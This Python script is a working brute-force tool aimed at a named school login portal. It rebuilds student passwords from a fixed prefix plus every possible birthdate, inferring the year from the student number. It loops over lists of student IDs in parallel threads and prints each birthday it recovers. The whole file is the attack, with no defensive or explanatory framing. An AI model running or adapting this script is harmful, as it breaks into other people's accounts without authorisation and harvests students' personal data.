import requests
import datetime
import logging
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from typing import Optional, List

# 配置常量
LOGIN_URL = "http://portal.kcisec.com/login/Account/LogInCheck"
PASSWORD_TEMPLATE = "Kskq%{}"
SEARCH_ORDER = [7, 8, 6, 9]
DEFAULT_FILE = "login.txt"
MAX_WORKERS = 10
TIMEOUT = 10
RETRIES = 3

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)

def login(username: str, password: str, session: requests.Session) -> bool:
    """执行登录操作，返回是否登录成功"""
    params = {
        "UserId": username,
        "Password": password,
        "Mode": "tuberculosis",
    }
    try:
        response = session.get(LOGIN_URL, params=params, timeout=TIMEOUT)
        return any(key in response.text for key in ("login_ok", "Account/ShowPage"))
    except requests.exceptions.RequestException as e:
        logging.error(f"登录请求失败 [{username}]: {str(e)}")
        return False

def validate_student_number(username: str) -> bool:
    """验证学号格式有效性"""
    if len(username) < 2:
        logging.warning(f"无效学号 [{username}]: 长度不足两位")
        return False
    try:
        int(username[:2])
        return True
    except ValueError:
        logging.warning(f"无效学号 [{username}]: 前两位非数字")
        return False

def generate_dates(start_year: int) -> datetime.datetime:
    """生成日期范围迭代器"""
    start_date = datetime.datetime(start_year, 9, 1)
    end_date = datetime.datetime(start_year + 1, 9, 1)
    current_date = start_date
    while current_date < end_date:
        yield current_date
        current_date += datetime.timedelta(days=1)

def find_birthday(username: str) -> Optional[str]:
    """主查询函数，返回生日字符串或None"""
    if not validate_student_number(username):
        return None

    prefix = int(username[:2])
    session = requests.Session()
    session.mount("http://", HTTPAdapter(max_retries=RETRIES))
    session.mount("https://", HTTPAdapter(max_retries=RETRIES))

    for grade_offset in SEARCH_ORDER:
        base_year = prefix - grade_offset + 2000
        logging.info(f"尝试 [{username}] 年级偏移量: {grade_offset} (基年: {base_year})")
        
        for current_date in generate_dates(base_year):
            password = PASSWORD_TEMPLATE.format(current_date.strftime("%Y%m%d"))
            if login(username, password, session):
                logging.info(f"成功匹配 [{username}]: {current_date.strftime('%Y%m%d')}")
                return current_date.strftime("%Y%m%d")
    
    logging.warning(f"未找到匹配生日 [{username}]：可能留级超过二级或不存在")
    return None

def read_student_numbers(file_path: str) -> List[str]:
    """从文件读取学号列表"""
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error(f"文件未找到: {file_path}")
        return []
    except Exception as e:
        logging.error(f"读取文件异常: {str(e)}")
        return []

def process_student(student_number: str) -> str:
    """处理单个学号的包装函数"""
    birthday = find_birthday(student_number)
    return f"{student_number}: {birthday}" if birthday else f"{student_number}: 未找到生日"

def main():
    """主程序逻辑"""
    choice = input("请选择搜索方式：\n1. 手动输入\n2. 文件输入\n请输入选项：").strip()
    student_numbers = []

    if choice == "1":
        if sn := input("请输入学号：").strip():
            student_numbers.append(sn)
    elif choice == "2":
        file_path = input(f"请输入文件路径（默认{DEFAULT_FILE}）：").strip() or DEFAULT_FILE
        student_numbers = read_student_numbers(file_path)
    else:
        print("无效选项，退出。")
        return

    if not student_numbers:
        print("没有有效的学号需要处理。")
        return

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        results = list(executor.map(process_student, student_numbers))

    print("\n查询结果：")
    for result in results:
        print(result)

if __name__ == "__main__":
    main()